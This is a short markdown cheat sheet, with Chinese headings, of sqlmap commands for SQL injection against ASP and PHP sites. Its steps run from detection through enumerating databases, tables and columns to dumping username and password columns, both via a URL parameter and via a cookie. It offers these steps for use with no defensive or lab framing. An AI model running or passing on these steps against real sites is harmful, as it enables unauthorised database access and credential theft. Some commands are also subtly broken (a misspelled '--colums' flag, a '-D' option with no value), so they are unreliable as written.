[001.sqlmap注入asp程序](001.sqlmap注入asp程序.md)
---

```bash
sqlmap -u "http://www.example.com/news.asp?id=110" 
```

```bash
sqlmap -u "http://www.example.com/news.asp?id=110"   --tables
```

```bash
 sqlmap -u "http://www.example.com/news.asp?id=110" --columns -T "user"
```

```bash
 sqlmap -u "http://www.example.com/news.asp?id=110" --dump -C "username,password" -T "user"
 ```
 
[002.sqlmap注入php程序](002.sqlmap注入php程序.md)
 ---
 
 ```bash
 sqlmap -u "http://www.example.com/news.php?id=110" 
 ```

 ```bash
 sqlmap -u "http://www.example.com/news.php?id=110"  --is-dba
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110"  --dbs
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --current-db
 ```
 
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --tables -D "db"
 ```
  
 ```bash
  sqlmap -u "http://www.example.com/news.php?id=110" --colums -T "admin_user" -D 
 ```
 
 [003.sqlmap之cookie注入](003.sqlmap之cookie注入.md)
 ---

 ```bash
 sqlmap -u "http://www.example.com/news.php" --cookie "id=110" --level 2
 ```
 
 ```bash
 sqlmap -u "http://www.example.com/news.php" --columns -T "user" --cookie "id=110" --level 2
 ```
 
 ```bash
 sqlmap -u "http://www.example.com/news.php" --dump  -C "username,password" -T "user"  --cookie "id=110" --level 2
 ```